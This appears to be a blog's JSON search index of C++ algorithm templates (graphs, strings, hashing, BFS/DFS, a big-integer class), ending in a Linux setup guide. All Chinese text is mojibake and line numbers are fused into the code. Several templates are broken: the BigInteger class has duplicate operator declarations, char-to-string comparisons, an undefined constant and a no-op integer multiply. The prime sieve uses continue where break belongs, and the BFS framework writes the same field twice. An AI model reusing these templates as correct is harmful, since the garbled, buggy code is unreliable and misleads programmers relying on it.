å®ç°12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455const int maxn = 1010;int ufs[maxn];int find(int x){ if (ufs[x] != x) return ufs[x] = find(ufs[x]); return ufs[x] = x;}void unionn(int x, int y){ int a = find(x); int b = find(y); if (a != b) { ufs[a] = b; }}const int maxm = 100010;struct Edge{ int a, b, w; bool select;}edge[maxm];bool cmp(Edge a, Edge b){ if (a.w != b.w) return a.w &lt; b.w; if (a.a != b.a) return a.a &lt; b.a; return a.b &lt; b.b; }void kruskal(){ for (int i = 1; i &lt;= n; ++i) { ufs[i] = i; } int k = 0, x, y; sort(edge + 1, edge + 1 + m, cmp); for (int i = 1; i &lt;= m; ++i) { if (k == n - 1) break; x = find(edge[i].a); y = find(edge[i].b); if (x != y) { unionn(x, y); k++; edge[i].select = true; } }}","link":"/p/c4fb1928.html"},{"title":"Cppç®—æ³•-å­—ç¬¦ä¸²ç®—æ³•-KMP","text":"ä¾‹ï¼šæ´›è°·P3375 è¯´æ˜pre()æ±‚å‰ç¼€æ•°ç»„kmp()åŒ¹é…å­—ç¬¦ä¸² å®ç°12345678910111213141516171819202122232425262728293031323334353637383940char s1[1000010], s2[1000010];int nxt[1000010], l1, l2;void pre(){ nxt[1] = 0; int j = 0; for (int i = 1; i &lt; l2; ++i) { while (j &gt; 0 &amp;&amp; s2[j + 1] != s2[i + 1]) j = nxt[j]; if (s2[j + 1] == s2[i + 1]) j++; nxt[i + 1] = j; }}void kmp(){ int j = 0; for (int i = 0; i &lt; l1; ++i) { while (j &gt; 0 &amp;&amp; s2[j + 1] != s1[i + 1]) j = nxt[j]; if (s2[j + 1] == s1[i + 1]) j++; if (j == l2) { printf(&quot;%d\\n&quot;, i - l2 + 2); j = nxt[j]; } }}int main(){ cin &gt;&gt; s1 + 1; cin &gt;&gt; s2 + 1; l1 = strlen(s1 + 1); l2 = strlen(s2 + 1); pre(); kmp(); return 0;}","link":"/p/632c6631.html"},{"title":"Cppç®—æ³•-å­—ç¬¦ä¸²ç®—æ³•-å“ˆå¸Œè¡¨","text":"ä¾‹ï¼šæ´›è°·P4305 è¯´æ˜hash[]å“ˆå¸Œè¡¨find(int x)æŸ¥æ‰¾å“ˆå¸Œè¡¨ä¸­ $x$ çš„ä½ç½®push(int x)å°† $x$ æ’å…¥åˆ°å“ˆå¸Œè¡¨ä¸­check(int x)æŸ¥æ‰¾ $x$ æ˜¯å¦åœ¨å“ˆå¸Œè¡¨ä¸­ å®ç°1234567891011121314151617181920212223242526272829303132333435363738394041424344#define p 100003#define hash(a) a%pint h[p], t, n, x;int find(int x){ int y; if (x &lt; 0) y = hash(-x); else y = hash(x); while (h[y] &amp;&amp; h[y] != x) y = hash(++y); return y;}void push(int x){ h[find(x)] = x;}bool check(int x){ return h[find(x)] == x;}int main(){ scanf(&quot;%d&quot;, &amp;t); while (t--) { memset(h, 0, sizeof(h)); scanf(&quot;%d&quot;, &amp;n); while (n--) { scanf(&quot;%d&quot;, &amp;x); if (!check(x)) { printf(&quot;%d &quot;, x); push(x); } } printf(&quot;\\n&quot;); } return 0;}","link":"/p/666f05c6.html"},{"title":"Cppç®—æ³•-å­—ç¬¦ä¸²ç®—æ³•-å­—ç¬¦ä¸²å“ˆå¸Œ","text":"ä¾‹ï¼šæ´›è°·P3370 å•å“ˆå¸Œ(è‡ªç„¶æº¢å‡º)123456789101112typedef unsigned long long ULL;ULL base = 131, a[10010];char s[10010];ULL hash(char* s){ int len = strlen(s); ULL Ans = 0; for (int i = 0; i &lt; len; i++) Ans = Ans * base + (ULL)s[i]; return Ans &amp; 0x7fffffff;} å•å“ˆå¸Œ(å•æ¨¡æ•°)123456789101112typedef unsigned long long ULL;ULL base = 131, a[10010], mod = 19260817;char s[10010];ULL hash(char* s){ int len = strlen(s); ULL Ans = 0; for (int i = 0; i &lt; len; i++) Ans = (Ans * base + (ULL)s[i]) % mod; return Ans;} å•å“ˆå¸Œ(å¤§æ¨¡æ•°)12345678910111213typedef unsigned long long ULL;ULL base = 131, a[10010], mod = 212370440130137957LL;char s[10010];int prime = 233317;ULL hash(char* s){ int len = strlen(s); ULL Ans = 0; for (int i = 0; i &lt; len; ++i) Ans = (Ans * base + (ULL)s[i]) % mod + prime; return Ans;} åŒå“ˆå¸Œ12345678910111213141516171819202122232425typedef unsigned long long ULL;ULL base = 131, mod1=19260817, mod2=19660813;char s[10010];struct data{ ULL x,y;}a[10010];ULL hash1(char* s){ int len = strlen(s); ULL Ans = 0; for (int i = 0; i &lt; len; i++) Ans = (Ans * base + (ULL)s[i]) % mod1; return Ans;}ULL hash2(char* s){ int len = strlen(s); ULL Ans = 0; for (int i = 0; i &lt; len; i++) Ans = (Ans * base + (ULL)s[i]) % mod2; return Ans;}","link":"/p/114af1e8.html"},{"title":"Cppç®—æ³•-æ•°è®º-çº¿æ€§ç­›ç´ æ•°","text":"è¯´æ˜p[] æœ€ç»ˆç»“æœ å®ç°123456789101112131415161718bool vis[N];int p[N], cnt;void get_prime(){ for (int i = 2; i &lt; N; ++i) { if (!vis[i]) p[++cnt] = i; for (int j = 1; j &lt;= cnt; ++j) { int v = i * p[j]; if (v &gt;= N) break; vis[v] = true; if (i % p[j] == 0) continue; } }}","link":"/p/cff9d95.html"},{"title":"Cppç®—æ³•-å›¾è®º-Floyd","text":"è¯´æ˜n, m, G[][]ç‚¹æ•°ã€è¾¹æ•°ã€é‚»æ¥çŸ©é˜µdist[][]æ¯å¯¹é¡¶ç‚¹é—´è·¯å¾„é•¿åº¦pre[][]æ¯å¯¹é¡¶ç‚¹ä¹‹é—´è·¯å¾„make()å»ºå›¾ å®ç°123456789101112131415161718192021222324252627282930313233343536373839404142434445const int maxn = 110;int n, m, G[maxn][maxn], dist[maxn][maxn], pre[maxn][maxn];void make(){ scanf(&quot;%d %d&quot;, &amp;n, &amp;m); for (int i = 1; i &lt;= n; ++i) for (int j = 1; j &lt;= n; ++j) G[i][j] = INT_MAX; for (int i = 1; i &lt;= n; ++i) G[i][i] = 0; for (int i = 1; i &lt;= m; ++i) { int from, to, w; scanf(&quot;%d %d %d&quot;, &amp;from, &amp;to, &amp;w); G[from][to] = w; } return;}void Floyd(){ for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= n; ++j) { dist[i][j] = G[i][j]; pre[i][j] = i; } } for (int k = 1; k &lt;= n; ++k) { for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= n; ++j) { if (dist[i][k] != INT_MAX &amp;&amp; dist[k][j] != INT_MAX &amp;&amp; dist[i][k] + dist[k][j] &lt; dist[i][j]) { dist[i][j] = dist[i][k] + dist[k][j]; pre[i][j] = pre[k][j]; } } } } return;}","link":"/p/ba77762f.html"},{"title":"Cppç®—æ³•-å›¾è®º-æ¬§æ‹‰å›è·¯","text":"é‚»æ¥çŸ©é˜µè¯´æ˜G[][]é‚»æ¥çŸ©é˜µdeg[]åº¦ans[]æ¬§æ‹‰å›è·¯n, eç‚¹æ•°ã€è¾¹æ•° å®ç°123456789101112131415161718192021222324252627282930313233343536int G[maxn][maxn], deg[maxn], ans[maxn];int n, e, x, y, ansi, s;void Euler(int i){ for (int j = 1; j &lt;= n; ++j) { if (G[i][j]) { G[i][j] = G[j][i] = 0; Euler(j); } } ans[++ansi] = i;}int main(){ scanf(&quot;%d %d&quot;, &amp;n, &amp;e); for (int i = 1; i &lt;= e; ++i) { scanf(&quot;%d %d&quot;, &amp;x, &amp;y); G[x][y] = G[y][x] = 1; deg[x]++; deg[y]++; } s = 1; for (int i = 1; i &lt;= n; ++i) if (deg[i] % 2 == 1) s = i; Euler(s); for (int i = 1; i &lt;= ansi; ++i) printf(&quot;%d &quot;, ans[i]); printf(&quot;\\n&quot;); return 0;} é“¾å¼å‰å‘æ˜Ÿè¯´æ˜n, mç‚¹æ•°ã€è¾¹æ•°head, edge[]é“¾å¼å‰å‘æ˜Ÿans[], ansiè·¯å¾„ã€æ•°ç»„å¤§å°vis[]è®°å½•make()å»ºå›¾ å®ç°12345678910111213141516171819202122232425262728293031323334353637int head[maxn];struct Node{ int to, next;}edge[maxm];void make(){ scanf(&quot;%d %d&quot;, &amp;n, &amp;m); for (int k = 1; k &lt;= m; ++k) { int i, j; scanf(&quot;%d %d&quot;, &amp;i, &amp;j); edge[k].to = i; edge[k].next = head[i]; head[i] = k; } return;}int ans[maxm];int ansi = 0;bool vis[2 * maxm];void dfs(int now){ for (int k = head[now]; k != 0; k = edge[k].next) { if (!vis[k]) { vis[k] = true; vis[k ^ 1] = true; dfs(edge[k].to); ans[ansi++] = k; } }}","link":"/p/57662471.html"},{"title":"Cppç®—æ³•-åŠ¨æ€è§„åˆ’","text":"å¾…å®Œæˆ å¤šé˜¶æ®µè¿‡ç¨‹å†³ç­–çš„æœ€ä¼˜åŒ–é—®é¢˜12345678910111213141516graph LR A --5--&gt; B1 A --3--&gt; B2 B1 --1--&gt; C1 B1 --6--&gt; C2 B1 --3--&gt; C3 B2 --8--&gt; C2 B2 --4--&gt; C4 C1 --5--&gt; D1 C1 --6--&gt; D2 C2 --5--&gt; D1 C3 --8--&gt; D3 C4 --3--&gt; D3 D1 --3--&gt; E D2 --4--&gt; E D3 --3--&gt; E !!! tldr â€œé¢˜ç›®åŠæ³¨è§£â€ æ±‚ä¸Šå›¾ä» $A$ åˆ° $E$ çš„æœ€çŸ­è·ç¦» $K$: é˜¶æ®µ $D(X_I, (X+1)_J)$: ä» $X_I$ åˆ° $(X+1)_J$ çš„è·ç¦» $F_K(X_I)$: $K$ é˜¶æ®µä¸‹ $X_I$ åˆ°ç»ˆç‚¹ $E$ çš„æœ€çŸ­è·ç¦» å€’æ¨:$$K=4\\qquad F_4(D_1)=3\\qquad F_4(D_2)=4\\qquad F_4(D_3)=3$$$$K=5\\qquad F_3(C_1)=min(D(C_1,D_1)+F_4(D_1),D(C_1,D_2)+F_4(D_2))=min(5+3,6+4)=8F_3(C_2)$$","link":"/p/8364d7e9.html"},{"title":"Cppç®—æ³•-å›¾è®º-Dijkstra","text":"è¯´æ˜n, mç‚¹æ•°ã€è¾¹æ•°G[][]é‚»æ¥çŸ©é˜µå­˜å›¾dist[]è·¯å¾„é•¿åº¦pre[]è·¯å¾„make()å»ºå›¾ å®ç°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657const int maxn = 10010;int n, m, G[maxn][maxn], dist[maxn], pre[maxn], s;void make(){ scanf(&quot;%d %d&quot;, &amp;n, &amp;m); for (int i = 1; i &lt;= n; ++i) for (int j = 1; j &lt;= n; ++j) G[i][j] = INT_MAX; for (int i = 1; i &lt;= n; ++i) G[i][i] = 0; for (int i = 1; i &lt;= m; ++i) { int from, to, w; scanf(&quot;%d %d %d&quot;, &amp;from, &amp;to, &amp;w); G[from][to] = w; } return;}void Dijkstra(){ int k, min; bool p[maxn]; for (int i = 1; i &lt;= n; ++i) { p[i] = false; if (i != s) { dist[i] = G[s][i]; pre[i] = s; } } dist[s] = 0; p[s] = true; for (int i = 1; i &lt;= n - 1; ++i) { min = INT_MAX; k = 0; for (int j = 1; j &lt;= n; ++j) { if (!p[j] &amp;&amp; dist[j] &lt; min) { min = dist[j]; k = j; } } if (k == 0) return; p[k] = true; for (int j = 1; j &lt;= n; ++j) { if (!p[j] &amp;&amp; G[k][j] != INT_MAX &amp;&amp; dist[j] &gt; dist[k] + G[k][j]) { dist[j] = dist[k] + G[k][j]; pre[j] = k; } } } return;} å †ä¼˜åŒ–(é“¾å¼å‰å‘æ˜Ÿ)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748struct Edge{ int to, nxt, t;}edge[maxm &lt;&lt; 1];int head[maxn], cnt;void add(int a, int b, int t){ edge[++cnt].to = b; edge[cnt].nxt = head[a]; edge[cnt].t = t; head[a] = cnt;}struct heap{ int u, d; bool operator &lt; (const heap&amp; a) const { return d &gt; a.d; }};void Dijkstra(){ priority_queue&lt;heap&gt; q; for (int i = 0; i &lt;= n; ++i) dist[i] = INF; dist[1] = 0; q.push((heap){1, 0}); while (!q.empty()) { heap top = q.top(); q.pop(); int tx = top.u; int td = top.d; if (td != dist[tx]) continue; for (int i = head[tx]; i; i = edge[i].nxt) { int v = edge[i].to; if (dist[v] &gt; dist[tx] + edge[i].t) { dist[v] = dist[tx] + edge[i].t; dy[v] = i; dx[v] = tx; //è®°å½•è·¯å¾„ q.push((heap){v, dist[v]}); } } }} è·¯å¾„123456int q = n, p[maxm];while (q != 1){ p[++tot] = dy[q]; q = dx[q];}","link":"/p/982e7a01.html"},{"title":"Cppç®—æ³•-æ ‘çŠ¶æ•°ç»„","text":"æ ‘çŠ¶æ•°ç»„æ¨¡æ¿ï¼šæ´›è°·P3374 è¯´æ˜tree[]æ ‘çŠ¶æ•°ç»„lowbit(int)ç¥å¥‡çš„å‡½æ•°add(int x, int k)ç¬¬ $x$ ä¸ªæ•°åŠ ä¸Š $k$ sum(int x)å‰ $x$ ä¸ªæ•°çš„å’Œ å®ç°1234567891011121314151617181920212223242526int tree[2000010];int lowbit(int k){ return k &amp; -k;}void add(int x, int k){ while (x &lt;= n) { tree[x] += k; x += lowbit(x); }}int sum(int x){ int ans = 0; while (x != 0) { ans += tree[x]; x -= lowbit(x); } return ans;}","link":"/p/72c90980.html"},{"title":"Cppç®—æ³•-å¤§æ•´æ•°ç±»","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401#include&lt;string&gt;#include&lt;iostream&gt;#include&lt;iosfwd&gt;#include&lt;cmath&gt;#include&lt;cstring&gt;#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;cstring&gt;using namespace std;const int maxl = 5000;#define max(a, b) a&gt;b ? a : b#define min(a, b) a&lt;b ? a : bclass BigInteger{ public: int len, s[maxl]; BigInteger(); BigInteger(const char*); BigInteger(int); bool sign; string toStr() const; friend istream&amp; operator&gt;&gt;(istream&amp;, BigInteger&amp;); friend ostream&amp; operator&lt;&lt;(ostream&amp;, BigInteger&amp;); BigInteger operator=(const char*); BigInteger operator=(int); BigInteger operator=(const string); bool operator&gt;(const BigInteger&amp;) const; bool operator&gt;=(const BigInteger&amp;) const; bool operator&gt;(const BigInteger&amp;) const; bool operator&gt;=(const BigInteger&amp;) const; bool operator==(const BigInteger&amp;) const; bool operator!=(const BigInteger&amp;) const; BigInteger operator+(const BigInteger&amp;) const; BigInteger operator++(); BigInteger operator++(int); BigInteger operator+=(const BigInteger&amp;); BigInteger operator-(const BigInteger&amp;) const; BigInteger operator--(); BigInteger operator--(int); BigInteger operator-=(const BigInteger&amp;); BigInteger operator*(const BigInteger&amp;) const; BigInteger operator*(const int num) const; BigInteger operator*=(const BigInteger&amp;); BigInteger operator/(const BigInteger&amp;) const; BigInteger operator/=(const BigInteger&amp;); BigInteger operator%(const BigInteger&amp;) const; BigInteger factorial() const; BigInteger Sqrt() const; BigInteger Pow(const BigInteger&amp;) const; void clean(); ~BigInteger;};BigInteger::BigInteger(){ memset(s, 0, sizeof(s)); len = 1; sign = 1;}BigInteger::BigInteger(const char *num){ *this = num;}BigInteger::BigInteger(int num){ *this = num;}string BigInteger::toStr() const{ string res; res = &quot;&quot;; for (int i = 0; i &lt; len; ++i) res = (char)(s[i] + '0') + res; if (res == &quot;&quot;) res = &quot;0&quot;; if (!sign &amp;&amp; res != &quot;0&quot;) res = &quot;-&quot; + res; return res;}istream&amp; operator&gt;&gt;(istream&amp; in, BigInteger&amp; num){ string str; in&gt;&gt;str; num = str; return in;}ostream&amp; operator&lt;&lt;(ostream&amp; out, BigInteger&amp; num){ out&lt;&lt;num.toStr(); return out;}BigInteger BigInteger::operator=(const char* num){ memset(s, 0, sizeof(s)); char a[maxl] = &quot;&quot;; if (num[0] != &quot;-&quot;) strcpy(a, num); else for (int i = 1; i &lt; strlen(num); ++i) a[i - 1] = num[i]; sign = !(num[0] == &quot;-&quot;); len = strlen(a); for (int i = 0; i &lt; strlen(a); ++i) s[i] = a[len - i - 1] - 48; return *this;}BigInteger BigInteger::operator=(int num){ if (num &lt; 0) sign = 0, num = -num; else sign = 1; char temp[MAX_L]; sprintf(temp, &quot;%d&quot;, num); *this = temp; return *this;}BigInteger BigInteger::operator=(const string num){ const char* tmp; tmp = num.c_str(); *this = tmp; return *this;}bool BigInteger::operator&lt;(const BigInteger&amp; num) const{ if (sign^num.sign) return num.sign; if (len != num.len) return len &lt; num.len; for (int i = len - 1; i &gt;= 0; --i) if (s[i] != num.s[i]) return sign ? (s[i] &lt; num.s[i]) : (s[i] &gt; num.s[i]) return !sign;}bool BigInteger::operator&gt;(const BigInteger&amp; num) const{ return num &lt; *this;}bool BigInteger::operator&lt;=(const BigInteger&amp; num) const{ return !(*this &gt; num);}bool BigInteger::operator&gt;=(const BigInteger&amp; num) const{ return !(*this &lt; num);}bool BigInteger::operator!=(const BigInteger&amp; num) const{ return *this &gt; num || *this &lt; num;}bool BigInteger::operator==(const BigInteger&amp; num) const{ return !(num != *this);}BigInteger BigInteger::operator+(const BigInteger&amp; num) const{ if (sign^num.sign) { BigInteger tmp = sign ? num : *this; tmp.sign = 1; return sign ? *this - tmp : num - tmp; } BigInteger result; result.len = 0; int temp = 0; for (int i = 0; temp || i &lt; (max(len, num.len)); i++) { int t = s[i] + num.s[i] + temp; result.s[result.len++] = t % 10; temp = t / 10; } result.sign = sign; return result;}BigInteger BigInteger::operator++(){ *this = *this + 1; return *this;}BigInteger BigInteger::operator++(int){ BigInteger old = *this; ++(*this); return old;}BigInteger BigInteger::operator+=(const BigInteger&amp; num){ *this = *this + num; return *this;}BigInteger BigInteger::operator-(const BigInteger&amp; num) const{ BigInteger b = num, a = *this; if (!num.sign &amp;&amp; !sign) { b.sign = 1; a.sign = 1; return b - a; } if (!b.sign) { b.sign = 1; return a + b; } if (!a.sign) { a.sign = 1; b = BigInteger(0) - (a + b); return b; } if (a &lt; b) { BigInteger c = (b - a); c.sign = false; return c; } BigInteger result; result.len = 0; for (int i = 0, g = 0; i &lt; a.len; i++) { int x = a.s[i] - g; if (i &lt; b.len) x -= b.s[i]; if (x &gt;= 0) g = 0; else { g = 1; x += 10; } result.s[result.len++] = x; } result.clean(); return result;}BigInteger BigInteger::operator--(){ *this = *this - 1; return *this;}BigInteger BigInteger::operator--(int){ BigInteger old = *this; --(*this); return old;}BigInteger BigInteger::operator-=(const BigInteger&amp; num){ *this = *this - num; return *this;}BigInteger BigInteger::operator*(const BigInteger&amp; num) const{ BigInteger result; result.len = len + num.len; for (int i = 0; i &lt; len; i++) for (int j = 0; j &lt; num.len; j++) result.s[i + j] += s[i] * num.s[j]; for (int i = 0; i &lt; result.len; i++) { result.s[i + 1] += result.s[i] / 10; result.s[i] %= 10; } result.clean(); result.sign = !(sign^num.sign); return result;}BigInteger BigInteger::operator*(const int num) const{ BigInteger x = num; BigInteger z = *this; return *this;}BigInteger BigInteger::operator/(const BigInteger&amp; num) const{ BigInteger ans; ans.len = len - num.len + 1; if (ans.len &lt; 0) { ans.len = 1; return ans; } BigInteger divisor = *this, divid = num; divisor.sign = divid.sign = 1; int k = ans.len - 1; int j = len - 1; while (k &gt;= 0) { while (divisor.s[j] == 0) j--; if (k &gt; j) k = j; char z[MAX_L]; memset(z, 0, sizeof(z)); for (int i = j; i &gt;= k; i--) z[j - i] = divisor.s[i] + '0'; BigInteger dividend = z; if (dividend &lt; divid) { k--; continue; } int key = 0; while (divid*key &lt;= dividend) key++; key--; ans.s[k] = key; BigInteger temp = divid*key; for (int i = 0; i &lt; k; i++) temp = temp * 10; divisor = divisor - temp; k--; } ans.clean(); ans.sign = !(sign^num.sign); return ans;}BigInteger BigInteger::operator/=(const BigInteger&amp; num){ *this = *this / num; return *this;}BigInteger BigInteger::operator%(const BigInteger&amp; num) const{ BigInteger a = *this, b = num; a.sign = b.sign = 1; BigInteger result, temp = a / b*b; result = a - temp; result.sign = sign; return result;}BigInteger BigInteger::Pow(const BigInteger&amp; num) const{ BigInteger result = 1; for (BigInteger i = 0; i &lt; num; i++) result = result * (*this); return result;}BigInteger BigInteger::factorial() const{ BigInteger result = 1; for (BigInteger i = 1; i &lt;= *this; i++) result *= i; return result;}void BigInteger::clean(){ if (len == 0) len++; while (len &gt; 1 &amp;&amp; s[len - 1] == '\\0') len--;}BigInteger BigInteger::Sqrt() const{ if(*this &lt; 0) return - 1; if(*this &lt;= 1)return *this; BigInteger l = 0, r = *this, mid; while(r - l &gt; 1) { mid = (l + r) / 2; if(mid * mid &gt; *this) r = mid; else l = mid; } return l;}BigInteger::~BigInteger(){}","link":"/p/b995b9d7.html"},{"title":"Cppç®—æ³•-BFS","text":"è¯´æ˜æœ¬æ–‡å®ç°åªæ˜¯æ¡†æ¶ï¼Œåº”å½“çµæ´»è¿ç”¨ï¼Œbfs()å‡½æ•°å†…éƒ¨æ ¹æ®æƒ…å†µçµæ´»æ›´æ”¹å¹¿æœç®—æ³•åŸºäºæ ‘ã€é˜Ÿåˆ—å®ç°ï¼Œå…·ä½“æ€è·¯: å°†å½“å‰ç‚¹çš„å­èŠ‚ç‚¹å…¥é˜Ÿï¼Œå½“å‰ç‚¹å‡ºé˜Ÿï¼Œå¦‚æœå­èŠ‚ç‚¹æ»¡è¶³æ¡ä»¶åˆ™è®°å½•å¹¶é‡å¤æ­¤è¿‡ç¨‹ æ¡†æ¶æ•°ç»„æ¨¡æ‹Ÿé˜Ÿåˆ—12345678910111213141516171819202122232425void bfs(){ int head = 1, tail = 2; vis[start_x][start_y] = true; //æ ‡è®°èµ·å§‹ç‚¹ que[head][0] = start_x; que[head][1] = start_y; //èµ·å§‹ç‚¹å…¥é˜Ÿ while(head &lt; tail) //é˜Ÿä¸ä¸ºç©º { int x = que[head][0], y = que[head][1] //è·å–é˜Ÿé¦–ç‚¹ for (int i = 0; i &lt; å­èŠ‚ç‚¹æ•°; ++i) { int x2 = xå­èŠ‚ç‚¹, y2 = yå­èŠ‚ç‚¹; if (x2, y2æ»¡è¶³æ¡ä»¶ &amp;&amp; !vis[x2][y2]) { è®°å½•ç»“æœ; vis[x2][y2] = true; que[tail][0] = x2; que[tail][0] = y2; tail++; //å…¥é˜Ÿ } } head++; //é˜Ÿé¦–å‡ºé˜Ÿ } return} STL-queue123456789101112131415161718192021222324252627282930313233struct Node{ int x, y;}node, top;queue&lt;Node&gt; que;void bfs(){ vis[sx][sy] = true; node.x = sx; node.y = sy; que.push(node); ans[sx][sy] = 0; while(!que.empty()) { top = que.front(); for (int i = 0; i &lt; 8; ++i) { int x2 = ..., y2 = ...; if (x2, y2æ»¡è¶³æ¡ä»¶ &amp;&amp; !vis[x2][y2]) { è®°å½•ç»“æœ; vis[x2][y2] = true; node.x = x2; node.y = y2; que.push(node); } } que.pop(); } return;} ä¾‹æ´›è°·P1443 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include&lt;bits/stdc++.h&gt;using namespace std;int n, m, sx, sy, vis[210][210], ans[210][210];int gox[8] = {-2, -1, 1, 2, 2, 1, -1, -2};int goy[8] = {1, 2, 2, 1, -1, -2, -2, -1};struct horse{ int x, y;}node, top;queue&lt;horse&gt; que;void bfs(){ vis[sx][sy] = 1; node.x = sx; node.y = sy; que.push(node); ans[sx][sy] = 0; while(!que.empty()) { top = que.front(); for (int i = 0; i &lt; 8; ++i) { int x2 = top.x + gox[i]; int y2 = top.y + goy[i]; if (x2 &gt;= 1 &amp;&amp; x2 &lt;= n &amp;&amp; y2 &gt;= 1 &amp;&amp; y2 &lt;= m &amp;&amp; !vis[x2][y2]) { ans[x2][y2] = ans[top.x][top.y] + 1; vis[x2][y2] = 1; node.x = x2; node.y = y2; que.push(node); } } que.pop(); } return;}int main(){ scanf(&quot;%d %d %d %d&quot;, &amp;n, &amp;m, &amp;sx, &amp;sy); memset(ans, -1, sizeof(ans)); bfs(); for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= m; ++j) printf(&quot;%-5d&quot;, ans[i][j]); printf(&quot;\\n&quot;); } return 0;} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include&lt;bits/stdc++.h&gt;using namespace std;int n, m, sx, sy, vis[210][210], que[50000][2], ans[210][210];int gox[8] = {-2, -1, 1, 2, 2, 1, -1, -2};int goy[8] = {1, 2, 2, 1, -1, -2, -2, -1};void bfs(){ int head = 1, tail = 2; vis[sx][sy] = 1; que[head][0] = sx; que[head][1] = sy; ans[sx][sy] = 0; while (head &lt; tail) { int x, x2, y, y2; x = que[head][0]; y = que[head][1]; for (int i = 0; i &lt; 8; ++i) { x2 = x + gox[i]; y2 = y + goy[i]; if (x2 &gt;= 1 &amp;&amp; x2 &lt;= n &amp;&amp; y2 &gt;= 1 &amp;&amp; y2 &lt;= m &amp;&amp; !vis[x2][y2]) { ans[x2][y2] = ans[x][y] + 1; vis[x2][y2] = 1; que[tail][0] = x2; que[tail][1] = y2; tail++; } } head++; } return;}int main(){ scanf(&quot;%d %d %d %d&quot;, &amp;n, &amp;m, &amp;sx, &amp;sy); memset(ans, -1, sizeof(ans)); bfs(); for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= m; ++j) printf(&quot;%-5d&quot;, ans[i][j]); printf(&quot;\\n&quot;); } return 0;}","link":"/p/99890668.html"},{"title":"Cppç®—æ³•-DFS","text":"è¯´æ˜æœ¬æ–‡å®ç°åªæ˜¯æ¡†æ¶ï¼Œåº”å½“çµæ´»è¿ç”¨ï¼Œdfs(â€¦)å‡½æ•°è¿”å›å€¼ç±»å‹ã€å‚æ•°åˆ—è¡¨æ ¹æ®æƒ…å†µçµæ´»æ›´æ”¹ æ¡†æ¶1234567891011121314151617void dfs(å‚æ•°åˆ—è¡¨){ if (åˆ°è¾¾ç›®çš„åœ°) è¾“å‡ºç»“æœ; else { for (int i = 0; i &lt; è¡ŒåŠ¨æ–¹æ³•æ•°; ++i) { if (ä¸‹ä¸€æ­¥å¯è¡Œ) { è®°å½•æ­¤æ­¥; dfs(æ”¹åŠ¨åçš„å‚æ•°åˆ—è¡¨); å–æ¶ˆè®°å½•æ­¤æ­¥; } } } return;} ä¾‹æ´›è°·P1605 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;bits/stdc++.h&gt;using namespace std;int n, m, t, sx, sy, fx, fy, ans;int mg[6][6], now[6][6];int go[4][2] = {{-1, 0}, {0, 1}, {1, 0}, {0, -1}};void dfs(int x, int y){ int x2, y2; if (x == fx &amp;&amp; y == fy) ans++; else { for (int i = 0; i &lt; 4; ++i) { x2 = x + go[i][0]; y2 = y + go[i][1]; if (x2 &gt; 0 &amp;&amp; x2 &lt;= n &amp;&amp; y2 &gt; 0 &amp;&amp; y2 &lt;= m &amp;&amp; mg[x2][y2] == 0 &amp;&amp; now[x2][y2] == 0) { now[x2][y2] = 1; dfs(x2, y2); now[x2][y2] = 0; } } } return;}int main(){ memset(mg, 0, sizeof(mg)); scanf(&quot;%d %d %d&quot;, &amp;n, &amp;m, &amp;t); scanf(&quot;%d %d %d %d&quot;, &amp;sx, &amp;sy, &amp;fx, &amp;fy); for (int i = 1; i &lt;= t; ++i) { int x, y; scanf(&quot;%d %d&quot;, &amp;x, &amp;y); mg[x][y] = 1; } now[sx][sy] = 1; ans = 0; dfs(sx, sy); printf(&quot;%d&quot;, ans); return 0;}","link":"/p/9d047ada.html"},{"title":"Linuxç¾åŒ–æ–¹æ¡ˆ","text":"I. åˆæ­¥ç³»ç»Ÿä¼˜åŒ– æ›´æ”¹ç³»ç»Ÿæ—¶é—´ å®‰è£…python sudo apt install python å®‰è£…gitå¹¶æ·»åŠ sshå¯†é’¥ sudo apt install git git config --global user.name &quot;your_name&quot; git config --global user.email &quot;you@example.com&quot; ssh-keygen -t rsa -C &quot;your_email@youremail.com&quot;ä¸€è·¯å›è½¦ cat ~/.ssh/id_rsa.pubå¹¶å¤åˆ¶ç²˜è´´åˆ°githubä¸Š ssh -T git@github.comæµ‹è¯• git clone https://github.com/Tony031218/Beautiful_Linux.gitå…‹éš†ä¸‹æœ¬ä»“åº“ æ·»åŠ è¯­è¨€ settings -> Region&Language -> manage installed language -> install/remove languages -> input sources è½¯ä»¶æ›´æ–° sudo apt update sudo apt upgrade å®‰è£…GDebi sudo apt install gdebi å¸è½½libreoffice å®‰è£… WPS(å¯é€‰) sudo apt remove libreoffice-common ä»http://www.wps.cn/product/wpslinux/ ä¸Šä¸‹è½½WPS sudo dpkg -i wps-office_10.1.0.6757_amd64.deb å¸è½½firefox å®‰è£… Chrome(å¯é€‰) sudo apt remove firefox wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb sudo dpkg -i google-chrome* sudo apt -f install æ›´æ¢æ›´æ–°æº å·¦ä¸‹è§’ -&gt; all -&gt; Software&amp;Updates sudo apt update å®‰è£…vim sudo apt install vim èœå•æ ä½ç½® gsettings set com.canonical.Unity.Launcher launcher-position Bottomåº•éƒ¨ gsettings set com.canonical.Unity.Launcher launcher-position Leftå·¦ä¾§ II. ä¸»é¢˜é…ç½® å®‰è£… Unity-tweak-toolsudo apt install 